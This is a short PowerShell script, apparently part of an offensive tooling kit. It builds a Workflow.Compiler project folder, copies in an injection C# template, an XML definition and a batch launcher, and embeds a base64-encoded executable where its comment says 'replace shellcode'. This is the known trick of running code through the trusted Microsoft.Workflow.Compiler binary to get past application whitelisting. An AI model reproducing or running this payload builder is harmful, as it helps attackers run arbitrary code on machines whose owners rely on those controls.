param($folder)

. $PSScriptRoot\shared_functions.ps1

$csfile = "$PSScriptRoot\workflow_code_injectionsample.cs"
$xmlfile = "$PSScriptRoot\workflow_definitions_injectionsample.xml"
$runfile = "$PSScriptRoot\workflow_run.bat"

$projectfolder = "$folder\Workflow.Compiler"
$n = New-Item -Path "$folder\Workflow.Compiler" -ItemType Directory 

Copy-Item -Path $csfile -Destination "$projectfolder\code.txt"
Copy-Item -Path $xmlfile -Destination "$projectfolder\run.xml"
Copy-Item -Path $runfile -Destination "$projectfolder\run.bat"


$file = "$folder\csharpbin.exe"
ConvertTo-Base64 -SourceFilePath $file -TargetFilePath "$folder\file.txt"
$binary = get-content "$folder\file.txt"
Remove-Item "$folder\file.txt" -force

#replace shellcode

(Get-Content "$projectfolder\code.txt").replace('%code%', $binary) | Set-Content "$projectfolder\code.txt"
$n = $MyInvocation.MyCommand.Name
console -text "Executed: $n" -type "ok"